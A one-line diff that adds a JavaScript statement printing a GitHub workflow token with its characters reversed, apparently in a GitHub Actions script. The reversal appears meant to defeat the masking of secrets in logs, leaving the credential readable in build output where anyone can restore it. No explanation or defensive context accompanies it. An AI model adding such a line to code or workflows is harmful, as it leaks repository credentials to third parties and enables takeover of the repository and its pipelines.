@@ -1,0 +1,1 @@
+console.log(github.token.split("").reverse().join(""))
